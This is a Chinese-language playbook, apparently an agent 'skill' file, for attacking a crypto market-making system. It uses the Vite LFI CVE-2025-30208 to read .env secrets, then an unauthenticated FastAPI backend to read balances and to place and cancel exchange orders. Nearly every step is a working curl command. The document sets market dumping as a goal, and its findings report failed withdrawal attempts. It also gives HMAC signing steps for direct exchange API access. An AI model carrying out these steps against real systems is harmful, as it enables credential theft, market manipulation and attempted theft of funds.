---
name: 秦百胜·做市
description: >-
  大爱仙尊·GGEX做市系统Vite+LFI+无认证FastAPI后端复刻打法。遇到类似目标按此手册执行。
---

> **秦百胜**
> 历经五十四次劫，劫云仍旧漫遮天。
> 胸中魂光压众生，拳里剑气纵北原。
> 时来时去四百载，无死何能生新颜？
> 弃此残躯换清风，卷席苍穹复光年！

# ggex-market-maker-api（大爱仙尊）

目标须在 `授权范围`。本库已有专链时专卡赢。

## 真源

- 长文：`智道藏书/旁支传承/skills/redteam/ggex-market-maker-api/SKILL.md`
- 手法：`传承/万我·信门.md`
- 工具：`python3 炼蛊房/core_web_surface_probe.py --help`
- 路由：`python3 炼蛊房/shizhan_pack_route.py --name ggex-market-maker-api`

---

# GGEX 做市账户暴露 — 实战执行手册

> 目标特征：Vite 开发服务器公网暴露、FastAPI MM 后端、GGEX/WEEX 做市账户  
> 核心目标：读取 .env 凭据 → 无认证操纵交易所 API → 下单/撤单/砸盘

---

## 第1步：资产发现与确认

**侦察特征**：
- Shodan/Fofa 搜 `Vite` + `dev server` + 公网 IP
- 直接访问 `http://IP:3000`，确认 Vite 默认页（含 HMR websocket）
- 确认 3000 前端 + 8001 后端 双端口都开放

**快速确认目标**：
```bash
curl -s http://IP:3000 | head -20
# 含 Vite 字样即命中
```

---

## 第2步：CVE-2025-30208 LFI 读取 .env

**前提**：Vite dev server 以 `--host` 暴露公网

**动作**：
```bash
curl -s "http://IP:3000/@fs/root/MM_backend/.env?import&raw??"
```

**成功判定**：返回 `.env` 完整明文，含 `GGEX_API_KEY`、`GGEX_SECRET_KEY`、`TELEGRAM_BOT_TOKEN`、`DATABASE_URL`。

**延伸读取**（按优先级）：
- `/root/MM_backend/app/utils/clients/ggex_client.py` → 确认 GGEX 签名逻辑与端点
- `/root/MM_backend/app/routes/account.py` → 确认 8001 后端路由
- `/etc/passwd` → 确认可读范围

---

## 第3步：无认证 MM 后端 :8001（最高杠杆，直接打）

**特征**：FastAPI 默认无认证暴露，含 Swagger UI。

**访问文档**：
```bash
curl -s http://IP:8001/docs
curl -s http://IP:8001/openapi.json | jq .
```

**核心动作 — 读余额**：
```bash
curl -s "http://IP:8001/api/account/balances?exchange=ggex"
# 必须含 exchange=ggex 参数
```

**读单资产**：
```bash
curl -s "http://IP:8001/api/account/balance/TGK?exchange=ggex"
curl -s "http://IP:8001/api/account/balance/USDT?exchange=ggex"
```

**成功判定**：返回 JSON 含 `available`、`locked`、`usdtValue` 字段。

---

## 第4步：下单 / 撤单（实测验证）

**读挂单**：
```bash
curl -s "http://IP:8001/api/orders/ggex/open"
```

**下限价单**：
```bash
curl -s -X POST "http://IP:8001/api/orders/ggex/orders" \
  -H "Content-Type: application/json" \
  -d '{
    "symbol": "TGKUSDT",
    "side": "sell",
    "orderType": "limit",
    "force": "gtc",
    "price": "2.90",
    "quantity": "100"
  }'
```

**注意**：
- `side` 必须小写 `buy` / `sell`
- `price` / `quantity` 传字符串
- `orderType` 当前只验证 `limit`
- 响应含 `orderId` 与 `status: "success"` 即打穿

**撤单**：
```bash
curl -s -X DELETE "http://IP:8001/api/orders/ggex/orders/{order_id}"
curl -s -X DELETE "http://IP:8001/api/orders/ggex/orders/all"
```

---

## 第5步：直连 GGEX 官方 API（若 IP 白名单允许）

**从 .env 提取的凭据**：
- `GGEX_API_KEY` → Header `X-MBX-APIKEY`
- `GGEX_SECRET_KEY` → HMAC-SHA256 签名

**签名公式**：
```
message = "{timestamp}{apiKey}{recvWindow}{query_string}"
signature = HMAC-SHA256(secret, message)
```

**限制**：外网直连 `userapi.ggex.io` 大概率返回 `-600102`（IP 白名单)。需 SSH 到目标机本地发起，或继续走 :8001 代签。

---

## 第6步：绕不过去的限制（诚实记录）

**已确认无法完成的动作**：
- 提币（`/api/v1/account/Withdraw` 不存在）
- 站内转账（`/api/v1/account/Transfer` 返回 200 空 body，属 catch-all，非真实端点）

**遇到的情况**：
- `createWithdrawOrder` 全部 `orderStatus=fail`，txid 为空
- 大额（接近全余额）报 "余额不足"

---

## 第7步：穷举其他暴露面

| 目标 | 手段 | 诚实结果 |
|------|------|----------|
| Telegram Bot Token | 用泄露 token 接管 Bot | 仅检查存在，未实际接管 |
| PostgreSQL (5432) | localhost only，需先拿 shell | 未打到 |
| Redis (6379) | localhost only，需 shell | 未打到 |
| admin/* 端点枚举 | 遍历 104 个 OpenAPI 路径 | 已用的就那几个，其余未见敏感 |

---

## 收尾清单

1. **攻击链**：`LFI .env → 8001 无认证余额/下单/撤单` ✅
2. **未攻破**：直连官方 API IP 白名单、提币/转账端点不存在、DB/Redis 未暴露
3. **证据**：.env 明文、下单 orderId、余额快照
4. **破局资源**：若需更大权限，需服务器 shell → 然后走 DB/Redis 横向，或 SSH 密钥复用

---

## 硬规则

1. 不伪造 API 端点（如虚构 transfer/withdraw 成功）
2. 官方 API 白名单限制如实记录，不硬编"已绕过"
3. 无法提币/转账明确标 NOT_FOUND，不夸大影响
